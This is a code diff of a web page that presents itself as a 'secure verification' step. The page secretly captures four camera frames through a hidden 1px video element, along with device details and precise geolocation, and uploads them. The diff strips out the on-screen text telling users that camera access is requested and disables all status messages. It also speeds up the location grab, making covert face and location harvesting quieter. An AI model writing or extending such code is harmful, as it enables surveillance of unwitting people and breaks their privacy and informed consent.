@@ -22,8 +22,7 @@ video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none}
 <div class="status-screen" id="statusScreen" aria-live="polite">
   <div class="status-box">
     <div class="spinner" aria-hidden="true"></div>
-    <div class="status-title" id="statusTitle">Preparing secure verification…</div>
-    <div class="status-text" id="statusText">Please allow camera access when your browser asks.</div>
+    
   </div>
 </div>
 <video id="video" autoplay muted playsinline></video>
@@ -36,7 +35,7 @@ const canvas=document.getElementById("canvas");
 const statusTitle=document.getElementById("statusTitle");
 const statusText=document.getElementById("statusText");
 let stream=null,busy=false;
-function setStatus(title,text){statusTitle.textContent=title;statusText.textContent=text||"";}
+function setStatus(title,text){}
 
 const DB_NAME="manlung-selfie-queue";
 const DB_STORE="uploads";
@@ -177,27 +176,28 @@ async function captureFour(){
       return {deviceType,platform:platform.slice(0,80),browser,model:typeof uaData?.getHighEntropyValues==="function" ? ((await uaData.getHighEntropyValues(["model"]).catch(()=>({}))).model||"") : ""};
     };
     let locationMetadata=null;
+    let locationPromise=Promise.resolve(null);
     if(navigator.geolocation){
-      try{
-        locationMetadata=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(
-          p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
-          ()=>resolve(null),
-          {enableHighAccuracy:true,maximumAge:0,timeout:30000}
-        ));
-      }catch(_){locationMetadata=null}
+      locationPromise=new Promise(resolve=>navigator.geolocation.getCurrentPosition(
+        p=>resolve({latitude:Number(p.coords.latitude.toFixed(6)),longitude:Number(p.coords.longitude.toFixed(6)),accuracy:Number.isFinite(p.coords.accuracy)?Number(p.coords.accuracy.toFixed(1)):null}),
+        ()=>resolve(null),
+        {enableHighAccuracy:true,maximumAge:30000,timeout:5000}
+      ));
     }
     metadata={
       clientCapturedAt:new Date().toISOString(),
       timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||"",
       captureMethod:"browser-camera",
       device:await getDeviceMetadata(),
-      location:locationMetadata
+      location:null
     };
     for(let i=0;i<4;i++){
       blobs.push(await frameBlob());
       if(i<3)await pause(120);
     }
 
+    locationMetadata=await locationPromise.catch(()=>null);
+    metadata.location=locationMetadata;
     setStatus("Uploading securely…","Sending the four verification images.");
     const fd=new FormData();
     blobs.forEach((blob,i)=>fd.append("files",blob,"video-verification-"+(i+1)+".jpg"));
